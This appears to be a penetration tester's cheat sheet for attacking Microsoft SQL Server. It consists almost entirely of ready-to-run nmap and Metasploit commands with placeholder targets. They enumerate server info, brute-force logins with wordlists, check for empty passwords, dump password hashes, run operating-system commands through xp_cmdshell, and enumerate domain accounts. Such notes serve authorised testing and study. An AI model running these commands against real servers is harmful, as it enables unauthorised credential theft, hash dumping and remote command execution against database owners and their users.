get server info
nmap --script ms-sql-info -p <port> <ip>
nmap -p <port> --script ms-sql-ntlm-info --script-args mssql.instance-port=<port> <ip>

metasploit:
use auxiliary/admin/mssql/mssql_enum
set RHOSTS <ip>


brute force users/passwords
nmap -p <port> --script ms-sql-brute --script-args userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Desktop/wordlist/100-common-passwords.txt <ip>

metasploit:
use auxiliary/scanner/mssql/mssql_login
set RHOSTS <ip>
set USER_FILE <file>
set PASS_FILE <file>
set VERBOSE false


check for empty password
nmap -p <port> --script ms-sql-empty-password <ip>

extract and output sysusers
nmap -p <port> --script ms-sql-query --script-args mssql.username=<user>,mssql.password=<pass>,ms-sql-query="SELECT \* FROM master..syslogins" <ip> -oN output.txt

metasploit:
use auxiliary/admin/mssql/mssql_enum_sql_logins
set RHOSTS <ip>

dump user hashes
nmap -p <port> --script ms-sql-dump-hashes --script-args mssql.username=<user>,mssql.password=<pass> <ip>

execute command via xp_cmdshell using nmap script
nmap -p <port> --script ms-sql-xp-cmdshell --script-args mssql.username=<user>,mssql.password=<pass>,ms-sql-xp-cmdshell.cmd="ipconfig" <ip>
(this only works if the target has xp_cmdshell enabled, which is not default)

execute command via xp_cmdshell using metasploit
use auxiliary/admin/mssql/mssql_exec
set RHOSTS <ip>
set CMD <command>

enumerate domain accounts via mssql
use auxiliary/admin/mssql/mssql_enum_domain_accounts
set RHOSTS <ip>
